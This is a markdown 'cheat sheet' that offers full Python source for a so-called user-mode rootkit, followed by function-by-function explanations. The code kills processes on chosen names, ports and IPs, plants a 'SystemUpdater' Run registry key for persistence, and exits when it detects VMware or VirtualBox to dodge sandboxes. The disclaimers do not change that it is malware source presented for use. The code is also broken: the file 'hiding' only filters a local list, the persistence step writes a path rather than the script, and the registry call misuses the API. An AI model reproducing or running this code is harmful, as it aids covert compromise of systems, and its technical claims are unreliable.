> ⚠️ **Disclaimer**: This code is for educational purposes only. Rootkits are highly invasive and can severely compromise a system’s security. Testing rootkit techniques should only be done in a controlled, isolated lab environment with proper authorization. Unauthorized deployment of rootkits is illegal and unethical.

# Rootkit Cheat Sheet (For Educational Purposes)

This cheat sheet provides an educational guide to a **Python-based User-mode Rootkit**. Rootkits enable attackers to hide processes, files, and network connections on a compromised system, granting persistent access while avoiding detection.

---

## Rootkit Overview

A **Rootkit** is designed to:
- **Hide Malicious Processes**: Make malicious processes invisible to system monitoring tools.
- **Conceal Files and Directories**: Prevent targeted files and directories from being displayed.
- **Evade Detection**: Operate covertly, evading security software and system administrators.
- **Persist**: Remain hidden even after system reboots, often via startup scripts or driver modules.

---

## Key Features in This Rootkit

1. **Process and File Hiding**: Uses low-level system functions to intercept and filter results.
2. **Automatic Dependency Installation**: Installs Python modules if they’re missing.
3. **Network Connection Concealment**: Hides network connections based on specific ports or IPs.
4. **Persistence**: Sets up automatic execution on startup.
5. **Anti-Analysis Evasion**: Detects virtualized environments to avoid sandboxing.

---

## Advanced Python Rootkit Code (User-mode)

This example rootkit script operates at the user level using Python and **ctypes** to intercept API calls. The rootkit hides specified files, directories, and processes.

### Full Rootkit Code

```python
import os
import sys
import time
import ctypes
import subprocess
import tempfile

# Automatic dependency installation
def install_module(module_name):
    try:
        __import__(module_name)
    except ImportError:
        print(f"[*] Installing {module_name} module...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", module_name])

# Ensure necessary modules are installed
install_module("psutil")
import psutil

# Configuration for hiding
HIDE_PROCESSES = ["malicious_process.exe"]
HIDE_FILES = ["hidden_file.txt", "sensitive_directory"]
HIDE_PORTS = [4444, 5555]  # Replace with ports to hide
HIDE_IPS = ["192.168.1.100"]

# Anti-analysis evasion delay
time.sleep(10)

# Check if running in a virtual environment
def is_virtual_environment():
    vmware_check = "VMware" in subprocess.getoutput("systeminfo")
    virtualbox_check = "VirtualBox" in subprocess.getoutput("systeminfo")
    return vmware_check or virtualbox_check

# Function to hide specific processes
def hide_processes():
    for proc in psutil.process_iter(['name']):
        try:
            if proc.info['name'] in HIDE_PROCESSES:
                proc.terminate()
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass

# Function to hide files and directories
def hide_files_and_directories():
    for root, dirs, files in os.walk("/"):
        # Remove hidden files and directories from lists
        dirs[:] = [d for d in dirs if d not in HIDE_FILES]
        files[:] = [f for f in files if f not in HIDE_FILES]
        print(f"Scanned {root}")  # This would be removed in a real rootkit to avoid detection

# Network connection hiding
def hide_network_connections():
    for conn in psutil.net_connections():
        if conn.laddr.port in HIDE_PORTS or conn.raddr and conn.raddr.ip in HIDE_IPS:
            conn_pid = conn.pid
            try:
                proc = psutil.Process(conn_pid)
                proc.terminate()
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass

# Persistence setup (Adding to startup)
def add_persistence():
    try:
        temp_dir = tempfile.gettempdir()
        persistence_script = os.path.join(temp_dir, "system_updater.py")
        with open(persistence_script, "w") as f:
            f.write(sys.argv[0])  # Write a copy of the rootkit script to startup

        # Windows registry startup entry
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        value_name = "SystemUpdater"
        ctypes.windll.advapi32.RegSetValueExW(ctypes.windll.advapi32.HKEY_CURRENT_USER, key, 0, 1, value_name, persistence_script)
        print("[*] Persistence established via registry key.")
    except Exception as e:
        print(f"[!] Persistence setup failed: {e}")

# Run rootkit functions
def start_rootkit():
    # Avoid running in virtual environments
    if is_virtual_environment():
        print("[!] Virtual environment detected. Exiting.")
        sys.exit(1)

    # Add rootkit to startup for persistence
    add_persistence()

    # Main loop for rootkit functions
    while True:
        hide_processes()
        hide_files_and_directories()
        hide_network_connections()
        time.sleep(5)  # Run at regular intervals

# Run rootkit
if __name__ == "__main__":
    start_rootkit()
```

---

## Explanation of Key Components

### 1. **Automatic Dependency Installation**

The `install_module()` function installs required dependencies if they are missing, using `pip`. The `psutil` library is necessary for interacting with system processes and network connections.

```python
def install_module(module_name):
    try:
        __import__(module_name)
    except ImportError:
        print(f"[*] Installing {module_name} module...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", module_name])
```

### 2. **Process Hiding**

This function iterates through running processes and hides those that match specific names by terminating them. In more advanced rootkits, system calls would be intercepted to hide processes without killing them.

```python
def hide_processes():
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] in HIDE_PROCESSES:
            proc.terminate()
```

### 3. **File and Directory Hiding**

The script removes specified directories and files from directory listings. A real rootkit would likely hook system calls directly to prevent these files from appearing, but this Python example filters them from the list.

```python
def hide_files_and_directories():
    for root, dirs, files in os.walk("/"):
        dirs[:] = [d for d in dirs if d not in HIDE_FILES]
        files[:] = [f for f in files if f not in HIDE_FILES]
```

### 4. **Network Connection Hiding**

This function hides network connections on specific ports or IPs by terminating associated processes.

```python
def hide_network_connections():
    for conn in psutil.net_connections():
        if conn.laddr.port in HIDE_PORTS or conn.raddr and conn.raddr.ip in HIDE_IPS:
            conn_pid = conn.pid
            proc = psutil.Process(conn_pid)
            proc.terminate()
```

### 5. **Persistence Mechanism**

The script copies itself to a temporary directory and adds a registry entry to launch on startup. This ensures it will run each time the system reboots.

```python
def add_persistence():
    temp_dir = tempfile.gettempdir()
    persistence_script = os.path.join(temp_dir, "system_updater.py")
    with open(persistence_script, "w") as f:
        f.write(sys.argv[0])

    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    value_name = "SystemUpdater"
    ctypes.windll.advapi32.RegSetValueExW(ctypes.windll.advapi32.HKEY_CURRENT_USER, key, 0, 1, value_name, persistence_script)
```

### 6. **Anti-Analysis Evasion**

The rootkit detects if it is running in a virtualized environment and exits if certain indicators are found.

```python
def is_virtual_environment():
    vmware_check = "VMware" in subprocess.getoutput("systeminfo")
    virtualbox_check = "VirtualBox" in subprocess.getoutput("systeminfo")
    return vmware_check or virtualbox_check
```

---

## Security and Legal Disclaimer

This rootkit script is strictly for educational purposes and should only be used in a controlled, isolated lab environment. Unauthorized use or deployment of rootkits is illegal and unethical.

```
